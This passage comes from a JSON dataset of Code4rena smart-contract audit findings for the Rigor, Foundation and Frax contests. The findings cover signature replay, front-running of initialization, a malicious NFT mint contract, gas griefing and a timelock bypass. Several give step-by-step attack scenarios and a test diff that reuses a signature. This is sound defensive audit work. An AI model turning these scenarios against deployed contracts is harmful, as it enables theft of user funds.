chain with another chain ID. For instance, let's say it is also launched on Polygon. An attacker can now use all of the Ethereum signatures there. Because the Polygon addresses of user's (and potentially contracts, when the nonces for creating are the same) are often identical, there can be situations where the payload is meaningful on both chains. 3.) Signature reuse across Rigor functions: Some functions accept and decode data / signatures that were intended for other functions. For instance, see this example of providing the data & signature that was intended for `inviteContractor` to `setComplete`: ```diff diff --git a/test/utils/projectTests.ts b/test/utils/projectTests.ts index ae9e202..752e01f 100644 --- a/test/utils/projectTests.ts +++ b/test/utils/projectTests.ts @@ -441,7 +441,7 @@ export const projectTests = async ({      }    });  -  it('should be able to invite contractor', async () => { +  it.only('should be able to invite contractor', async () => {      expect(await project.contractor()).to.equal(ethers.constants.AddressZero);      const data = {        types: ['address', 'address'], @@ -452,6 +452,7 @@ export const projectTests = async ({        signers[1],      ]);      const tx = await project.inviteContractor(encodedData, signature); +    const tx2 = await project.setComplete(encodedData, signature);      await expect(tx)        .to.emit(project, 'ContractorInvited')        .withArgs(signers[1].address); ``` While this reverts because there is no task that corresponds to the address that is signed there, this is not always the case. 4.) Signature reuse from different Ethereum projects & phishing Because the payload of these signatures is very generic (two addresses, a byte and two uints), there might be situations where a user has already signed data with the same format for a completely different Ethereum application. Furthermore, an attacker could set up a DApp that uses the same format and trick someone into signing the data. Even a very security-conscious owner that has audited the contract of this DApp (that does not have any vulnerabilities and is not malicious, it simply consumes signatures that happen to have the same format) might be willing to sign data for this DApp, as he does not anticipate that this puts his Rigor project in danger.  ## Recommended Mitigation Steps I strongly recommend to follow [EIP-712](https://eips.ethereum.org/EIPS/eip-712) and not implement your own standard / solution. While this also improves the user experience, this topic is very complex and not easy to get right, so it is recommended to use a battle-tested approach that people have thought in detail about. All of the mentioned attacks are not possible with EIP-712: 1.) There is always a domain separator that includes the contract address. 2.) The chain ID is included in the domain separator 3.) There is a type hash (of the function name / parameters) 4.) The domain separator does not allow reuse across different projects, phishing with an innocent DApp is no longer possible (it would be shown to the user that he is signing data for Rigor, which he would off course not do on a different site)"}, {"title": "Lack of event emission after sensitive action ", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/49", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L92 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L113   # Vulnerability details  ## Impact The initialize function of the HomeFi contract does not emit the AdminReplaced event after setting the value of the  _msgSender() to be the admin.  Consider emitting events after sensitive changes occur to facilitate tracking and notify off-chain clients following the contracts\u2019 activity.  ## Proof of Concept  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L92 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L113  ## Tools Used vscode ## Recommended Mitigation Steps add event"}, {"title": "Incorrect initialization of smart contracts with Access Control issue", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/6", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFiProxy.sol#L216-L230 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L102-L119 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/DebtToken.sol#L43-L58 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Disputes.sol#L74-L81 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L92-L120 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L94-L105 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/ProjectFactory.sol#L45-L55   # Vulnerability details  ## Impact All next Impact depends on actions and attention from developers when deployed - Loss of funds  - Failure of the protocol, with the need for redeploy - Loss of control over protocol elements (some smart contracts) - The possibility of replacing contracts and settings with harmful ones And other things that come out of it...  ## Proof of Concept  For a proper understanding of Proof of Concept, you need to understand the following things: 1) Hardhat does not stop the process with a deploy and does not show failed transactions if they have occurred in some cases  2) Malicious agents can trace the protocol deployment transactions and insert their own transaction between them  Reason: - [During deploy TransparentUpgradeableProxy's](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFiProxy.sol#L216-L230) initialize method for initializing contracts not called. The third parameter responsible for this is an empty string. This causes the initialization process itself to be **delayed**  - Contract initialization methods have no check over who calls them Example [ProjectFactory.sol#L45-L55](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/ProjectFactory.sol#L45-L55)  **Also suitable for other contracts, strings are attached in Links to affected code **  Example of exploiting the vulnerability **Failure of the protocol, with the need for redeploy** && **Loss of control over protocol elements (some smart contracts)** : 1) User listen transaction in mempool, etherscan, transaction in block etc  2) Finds the moment of deployment and sends the transaction for setup his HomeFi address in Disputes contract:   Just he call initialize method and put his _homeFi parameter 3) In the event that hardhat tracked a failed transaction, the deployment will stop and you will need to start over. If the hardhead misses it and the developers do not check the result and the setting, access to this part will be lost and fix is needed  Example of exploiting the vulnerability **Loss of funds**: 1) User listen transaction in mempool, etherscan, transaction in block for listne when HomeFi will deployed 2) Send transaction for initialize [HomeFi](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L92-L120) with his _treasury address 3) Transfer the admin ownership the right to the real address to divert the eyes 4) The address of the treasury remains with the attacker 5) The protocol fees (fee) will be [transfered](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L443) to the attacker's address until it is detected   ## Recommended Mitigation Steps  Carry out checks at the initialization stage or redesign the deployment process with the initialization of contracts during deployment  "}, {"title": "Malicious Creator can steal from collectors upon minting with a custom NFT contract", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/211", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-foundation-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/nftDropMarket/NFTDropMarketFixedPriceSale.sol#L207   # Vulnerability details  # Malicious Creator can steal from collectors upon minting with a custom NFT contract  In the case of a fixed price sale where `nftContract` is a custom NFT contract that adheres to `INFTDropCollectionMint`, a malicious creator can set a malicious implementation of `INFTDropCollectionMint.mintCountTo()` that would result in collectors calling this function losing funds without receiving the expected amount of NFTs.  ## Impact  Medium   ## Proof Of Concept  Here is a [foundry test](https://gist.github.com/joestakey/4b13c7ae6029332da6eaf63b9d2a38bd) that shows a fixed price sale with a malicious NFT contract, where a collector pays for 10 NFTs while only receiving one. It can be described as follow:  - A creator creates a malicious `nftContract` with `mintCountTo` minting only one NFT per call, regardless of the value of `count`  - The creator calls `NFTDropMarketFixedPriceSale.createFixedPriceSale()` to create a sale for `nftContract`, with `limit` set to `15`.  - Bob is monitoring the `CreateFixedPriceSale` event. Upon noticing `CreateFixedPriceSale(customERC721, Alice, price, limit)`, he calls `NFTDropMarketFixedPriceSale.mintFromFixedPriceSale(customERC721, count == 10,)`. He pays the price of `count = 10` NFTs, but because of the logic in `mintCountTo`, only receives one NFT.  Note that `mintCountTo` can be implemented in many malicious ways, this is only one example. Another implementation could simply return `firstTokenId` without performing any minting.  ## Tools Used  Manual Analysis, Foundry  ## Mitigation  The problem here lies in the implementation of `INFTDropCollectionMint(nftContract).mintCountTo()`. You could add an additional check in `NFTDropMarketFixedPriceSale.mintCountTo()` using `ERC721(nftContract).balanceOf()`.   ```diff + uint256 balanceBefore = IERC721(nftContract).balanceOf(msg.sender); 207:     firstTokenId = INFTDropCollectionMint(nftContract).mintCountTo(count, msg.sender); + uint256 balanceAfter = IERC721(nftContract).balanceOf(msg.sender); + require(balanceAfter == balanceBefore + count, \"minting failed\") ``` "}, {"title": "NFT of NFT collection or NFT drop collection can be locked when calling _mint or mintCountTo function to mint it to a contract that does not support ERC721 protocol", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/183", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-foundation-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollection.sol#L262-L274 https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L171-L187   # Vulnerability details  ## Impact When calling the following `_mint` or `mintCountTo` function for minting an NFT of a NFT collection or NFT drop collection, the OpenZeppelin's `ERC721Upgradeable` contract's [`_mint`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L284-L296) function is used to mint the NFT to a receiver. If such receiver is a contract that does not support the ERC721 protocol, the NFT will be locked and cannot be retrieved.  https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollection.sol#L262-L274 ```   function _mint(string calldata tokenCID) private onlyCreator returns (uint256 tokenId) {     require(bytes(tokenCID).length != 0, \"NFTCollection: tokenCID is required\");     require(!cidToMinted[tokenCID], \"NFTCollection: NFT was already minted\");     unchecked {       // Number of tokens cannot overflow 256 bits.       tokenId = ++latestTokenId;       require(maxTokenId == 0 || tokenId <= maxTokenId, \"NFTCollection: Max token count has already been minted\");       cidToMinted[tokenCID] = true;       _tokenCIDs[tokenId] = tokenCID;       _mint(msg.sender, tokenId);       emit Minted(msg.sender, tokenId, tokenCID, tokenCID);     }   } ```  https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L171-L187 ```   function mintCountTo(uint16 count, address to) external onlyMinterOrAdmin returns (uint256 firstTokenId) {     require(count != 0, \"NFTDropCollection: `count` must be greater than 0\");      unchecked {       // If +1 overflows then +count would also overflow, unless count==0 in which case the loop would exceed gas limits       firstTokenId = latestTokenId + 1;     }     latestTokenId = latestTokenId + count;     require(latestTokenId <= maxTokenId, \"NFTDropCollection: Exceeds max tokenId\");      for (uint256 i = firstTokenId; i <= latestTokenId; ) {       _mint(to, i);       unchecked {         ++i;       }     }   } ```  For reference, [OpenZeppelin's documentation for `_mint`](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#ERC721-_mint-address-uint256-) states: \"Usage of this method is discouraged, use _safeMint whenever possible\".  ## Proof of Concept The following steps can occur when minting an NFT of a NFT collection or NFT drop collection. 1. The [`_mint`](https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollection.sol#L262-L274) or [`mintCountTo`](https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L171-L187) function is called with `msg.sender` or the `to` input corresponding to a contract. 2. The OpenZeppelin's `ERC721Upgradeable` contract's [`_mint`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L284-L296) function is called with `msg.sender` or `to` used in Step 1 as the receiver address. 3. Since calling the OpenZeppelin's `ERC721Upgradeable` contract's [`_mint`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L284-L296) function does not execute the same contract's [`_checkOnERC721Received`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L400-L422) function, it is unknown if the receiving contract inherits from the `IERC721ReceiverUpgradeable` interface and implements the `onERC721Received` function or not. It is possible that the receiving contract does not support the ERC721 protocol, which causes the minted NFT to be locked.  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollection.sol#L271 can be changed to the following code. ``` _safeMint(msg.sender, tokenId); ```  Also, https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L182 can be changed to the following code. ``` _safeMint(to, i); ```"}, {"title": "NFT creator sales revenue recipients can steal gas", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/165", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-foundation-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L130   # Vulnerability details  ## Impact  Selling a NFT with `NFTDropMarketFixedPriceSale.mintFromFixedPriceSale` distributes the revenue from the sale to various recipients with the `MarketFees._distributeFunds` function.  Recipients:  - NFT creator(s) - NFT seller - Protocol - Buy referrer (optional)  It is possible to have multiple NFT creators. Sale revenue will be distributed to each NFT creator address. Revenue distribution is done by calling `SendValueWithFallbackWithdraw._sendValueWithFallbackWithdraw` and providing an appropriate gas limit to prevent consuming too much gas. For the revenue distribution to the seller, protocol and the buy referrer, a gas limit of `SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT = 20_000` is used. However, for the creators, a limit of `SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS = 210_000` is used. This higher amount of gas is used if `PercentSplitETH` is used as a recipient.  A maximum of `MAX_ROYALTY_RECIPIENTS = 5` NFT creator recipients are allowed.  For example, a once honest NFT collection and its 5 royalty creator recipients could turn \"malicious\" and could \"steal\" gas from NFT buyers on each NFT sale and therefore grief NFT sales. On each NFT sell, the 5 creator recipients (smart contracts) could consume the full amount of `SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS = 210_000` forwarded gas. Totalling `5 * 210_000 = 1_050_000` gas. With a gas price of e.g. `20 gwei`, this equals to additional gas costs of `21_000_000 gwei = 0.028156 eth`, with a `ETH` price of `2000`, this would total to ~`56.31 $` additional costs.  ## Proof of Concept  [mixins/shared/MarketFees.sol#L130](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L130)  ```solidity /**   * @notice Distributes funds to foundation, creator recipients, and NFT owner after a sale.   */ function _distributeFunds(   address nftContract,   uint256 tokenId,   address payable seller,   uint256 price,   address payable buyReferrer )   internal   returns (     uint256 totalFees,     uint256 creatorRev,     uint256 sellerRev   ) {   address payable[] memory creatorRecipients;   uint256[] memory creatorShares;    uint256 buyReferrerFee;   (totalFees, creatorRecipients, creatorShares, sellerRev, buyReferrerFee) = _getFees(     nftContract,     tokenId,     seller,     price,     buyReferrer   );    // Pay the creator(s)   unchecked {     for (uint256 i = 0; i < creatorRecipients.length; ++i) {       _sendValueWithFallbackWithdraw(         creatorRecipients[i],         creatorShares[i],         SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS // @audit-info A higher amount of gas is forwarded to creator recipients       );       // Sum the total creator rev from shares       // creatorShares is in ETH so creatorRev will not overflow here.       creatorRev += creatorShares[i];     }   }    // Pay the seller   _sendValueWithFallbackWithdraw(seller, sellerRev, SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT);    // Pay the protocol fee   _sendValueWithFallbackWithdraw(getFoundationTreasury(), totalFees, SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT);    // Pay the buy referrer fee   if (buyReferrerFee != 0) {     _sendValueWithFallbackWithdraw(buyReferrer, buyReferrerFee, SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT);     emit BuyReferralPaid(nftContract, tokenId, buyReferrer, buyReferrerFee, 0);     unchecked {       // Add the referrer fee back into the total fees so that all 3 return fields sum to the total price for events       totalFees += buyReferrerFee;     }   } } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider only providing a higher amount of gas (`SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS`) for the first creator recipient. For all following creator recipients, only forward the reduced amount of gas `SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT`. "}, {"title": "Forget to check \"Some manifolds contracts of ERC-2981 return (address(this), 0) when royalties are not defined\" in 3rd priority - MarketFees.sol", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/147", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L299-L301   # Vulnerability details  ## Impact Wrong return of `cretorShares` and `creatorRecipients` can make real royalties party can't gain the revenue of sale.    ## Proof of concept  Function `getFees()` firstly [call](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L422-L430) to function `internalGetImmutableRoyalties` to get the list of `creatorRecipients` and `creatorShares` if the `nftContract` define ERC2981 royalties.  ```solidity= try implementationAddress.internalGetImmutableRoyalties(nftContract, tokenId) returns (   address payable[] memory _recipients,   uint256[] memory _splitPerRecipientInBasisPoints ) {   (creatorRecipients, creatorShares) = (_recipients, _splitPerRecipientInBasisPoints); } catch // solhint-disable-next-line no-empty-blocks {   // Fall through } ``` ----- In the [1st priority](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L236-L255) it check the `nftContract` define the function `royaltyInfo` or not. If yes, it get the return value `receiver` and `royaltyAmount`. In some manifold contracts of erc2981, it `return (address(this), 0)` when royalties are not defined. So we ignore it when the `royaltyAmount = 0`  ```solidity=   try IRoyaltyInfo(nftContract).royaltyInfo{ gas: READ_ONLY_GAS_LIMIT }(tokenId, BASIS_POINTS) returns (     address receiver,     uint256 royaltyAmount   ) {     // Manifold contracts return (address(this), 0) when royalties are not defined     // - so ignore results when the amount is 0     if (royaltyAmount > 0) {       recipients = new address payable[](1);       recipients[0] = payable(receiver);       splitPerRecipientInBasisPoints = new uint256[](1);       // The split amount is assumed to be 100% when only 1 recipient is returned       return (recipients, splitPerRecipientInBasisPoints);     } ``` ---- In the same sense, the [3rd priority](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L297-L312) (it can reach to 3rd priority when function `internalGetImmutableRoyalies` fail to return some royalties) should check same as the 1st priority with the `royaltyRegistry.getRoyaltyLookupAddress`. But the 3rd priority forget to check the case when `royaltyAmount == 0`.  ```solidity=   try IRoyaltyInfo(nftContract).royaltyInfo{ gas: READ_ONLY_GAS_LIMIT }(tokenId, BASIS_POINTS) returns (     address receiver,     uint256 /* royaltyAmount */   ) {     recipients = new address payable[](1);     recipients[0] = payable(receiver);     splitPerRecipientInBasisPoints = new uint256[](1);     // The split amount is assumed to be 100% when only 1 recipient is returned     return (recipients, splitPerRecipientInBasisPoints);   }  ``` It will make [function](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L98) `_distributeFunds()` transfer to wrong `creatorRecipients` (for example erc2981 return `(address(this), 0)`, market will transfer creator revenue to `address(this)` - market contract, and make the fund freeze in contract forever).  This case just happen when * `nftContract` doesn't have any support for royalties info  * `overrideContract` which was fetched from`royaltyRegistry.getRoyaltyLookupAddress(nftContract)` implements both function `getRoyalties` and `royaltyInfo` but doesn't support `royaltyInfo` by returning `(address(this), 0)`.   ## Tools Used Manual review     ## Recommended Mitigation Steps Add check if `royaltyAmount > 0` or not in 3rd priority  "}, {"title": "Creator fees may be burned", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/31", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-foundation-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-foundation/blob/7d6392498e8f3b8cdc22beb582188ffb3ed25790/contracts/mixins/shared/MarketFees.sol#L128   # Vulnerability details  ## Impact `royaltyInfo`, `getRoyalties`, or `getFeeRecipients` may return `address(0)` as the recipient address. While the value 0 is correctly handled for the royalties itself, it is not for the address. In such a case, the ETH amount will be sent to `address(0)`, i.e. it is burned and lost.  ## Recommended Mitigation Steps In your logic for determining the recipients, treat `address(0)` as if no recipient was returned such that the other priorities / methods take over."}, {"title": "Wrong assumption of block time might cause wrong interest rate", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/276", "labels": ["bug", "disagree with severity", "downgraded by judge", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairConstants.sol#L41 https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/LinearInterestRate.sol#L34 https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/VariableInterestRate.sol#L40 https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/VariableInterestRate.sol#L41   # Vulnerability details  ## Impact  All annual rate constants in the system are calculated with an assumption that block time is 15 second (actually it\u2019s from 12 to 14 seconds as in [the documentation](https://ethereum.org/vi/developers/docs/blocks/#block-time). And these constants are used to calculate rate in rate calculator and also used to reset interest rate when there are no borrows.  But actually, [the merge is really near](https://ethereum.org/vi/upgrades/merge/) and after the merge blocks come exactly each 12 seconds which basically makes all these constants wrong.   This resulted in wrong interest rate after reseting when there are no borrows and wrong rate returned by rate calculators.  ## Proof of Concept  These annual rate is calculated by solving an equation for `r` with an assumption 365.24 days per year and 15s blocks. For example, this is for the 0.5% annual rate ``` 1.005 = (1 + 15*r)^(365.24 * 24 * 3600 / 15) ```   But actually after the merge, blocks come in exactly each 12 seconds. Check out [this blog post](https://blog.ethereum.org/2021/11/29/how-the-merge-impacts-app-layer/) of Tim Beiko   [Line 431-433](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L431-L433) reset interest rate when there are no borrows ```solidity if (!paused()) {     _currentRateInfo.ratePerSec = DEFAULT_INT; } ```  These constants are used in `requireValidInitData()` and also `getNewRate()` function in rate calculators and wrong constants might make `getNewRate()` return wrong value. For example, [line 72-74](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/VariableInterestRate.sol#L72-L74) used `MIN_INT` as new interest rate ```solidity if (_newRatePerSec < MIN_INT) {     _newRatePerSec = MIN_INT; } ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Consider to update these constants with an assumption that block time is 12 seconds. "}, {"title": "Wrong percent for `FraxlendPairCore.dirtyLiquidationFee`.", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/238", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L194   # Vulnerability details  ## Impact After confirmed with the sponsor, `dirtyLiquidationFee` is 90% of `cleanLiquidationFee` like the [comment](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L194).  But it uses `9% (9000 / 1e5 = 0.09)` and the fee calculation will be wrong [here](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L988-L990).   ## Tools Used Manual Review   ## Recommended Mitigation Steps We should change `9000` to `90000`.  ``` dirtyLiquidationFee = (_liquidationFee * 90000) / LIQ_PRECISION; // 90% of clean fee ```"}, {"title": "FraxlendPair.changeFee() doesn't update interest before changing fee.", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/236", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L215-L222   # Vulnerability details  ## Impact This function is changing the protocol fee that is used during interest calculation [here](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L477-L488).  But it doesn't update interest before changing the fee so the `_feesAmount` will be calculated wrongly.   ## Proof of Concept As we can see during [pause()](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L326) and [unpause()](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L335), `_addInterest()` must be called before any changes.  But with the [changeFee()](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L215), it doesn't update interest and the `_feesAmount` might be calculated wrongly.  - At time `T1`, [_currentRateInfo.feeToProtocolRate = F1](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L477). - At `T2`, the owner had changed the fee to `F2`. - At `T3`, [_addInterest()](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L409) is called during `deposit()` or other functions. - Then [during this calculation](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L477-L488), `F1` should be applied from `T1` to `T2` and `F2` should be applied from `T2` and `T3`. But it uses `F2` from `T1` to `T2`.   ## Tools Used Manual Review   ## Recommended Mitigation Steps Recommend modifying `changeFee()` like below.  ``` function changeFee(uint32 _newFee) external whenNotPaused {     if (msg.sender != TIME_LOCK_ADDRESS) revert OnlyTimeLock();     if (_newFee > MAX_PROTOCOL_FEE) {         revert BadProtocolFee();     }      _addInterest(); //+++++++++++++++++++++++++++++++++      currentRateInfo.feeToProtocolRate = _newFee;     emit ChangeFee(_newFee); } ```"}, {"title": "Owner of `FraxlendPair` can set arbitrary time lock contract address to circumvent time lock", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/156", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L206   # Vulnerability details  ## Impact  The ownership of a deployed Fraxlend pair is transferred to `COMPTROLLER_ADDRESS` on deployment via `FraxlendPairDeployer_deploySecond`. This very owner is able to change the currently used time lock contract address with the `FraxlendPair.setTimeLock` function. A time lock is enforced on the `FraxlendPair.changeFee` function whenever the protocol fee is adjusted.  However, as the Fraxlend pair owner is able to change the time lock contract address to any other arbitrary (contract) address, it is possible to circumvent this timelock without users knowing. By using a custom smart contract without an enforced time lock, the protocol fee can be changed at any time without a proper time lock.  ## Proof of Concept  [FraxlendPair.sol#L206](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L206)  ````solidity /// @notice The ```setTimeLock``` function sets the TIME_LOCK address /// @param _newAddress the new time lock address function setTimeLock(address _newAddress) external onlyOwner {     emit SetTimeLock(TIME_LOCK_ADDRESS, _newAddress);     TIME_LOCK_ADDRESS = _newAddress; } ````  ## Tools Used  Manual review  ## Recommended mitigation steps  Currently, the owner `COMPTROLLER_ADDRESS` address is trustworthy, however, nothing prevents the above-described scenario. To protect users from sudden protocol fee changes, consider using a minimal time lock implementation directly implemented in the contract without trusting any external contract. "}, {"title": "FraxlendPair#setTimeLock: Allows the owner to reset TIME_LOCK_ADDRESS", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/129", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L84-L86 https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L204-L207   # Vulnerability details  ## Impact Allows to reset **TIME_LOCK_ADDRESS** value multiple times by the owner. According to comments in FraxlendPairCore this should act as a constant/immutable value. Given that this value will be define through function **setTimeLock** in **FraxLendPair** contract this value can changed whenever the owner wants. This does not seem the expected behaviour.  ## Proof of Concept The owner can call whenever they want the function **setTimeLock**, which reset the value of **TIME_LOCK_ADDRESS**  ## Tools Used Manual read  ## Recommended Mitigation Steps Add a bool which act as mutex if **TIME_LOCK_ADDRESS** has already been set, and modify **setTimeLock** function in FraxlendPair contract ```solidity // In FraxlendPair contract bool public timelockSetted; function setTimeLock(address _newAddress) external onlyOwner {         require(!timelockSetted);         emit SetTimeLock(TIME_LOCK_ADDRESS, _newAddress);         TIME_LOCK_ADDRESS = _newAddress;         timelockeSetted=true; } ```"}, {"title": "Any borrower with bad debt can be liquidated multiple times to lock funds in the lending pair", "html_url": 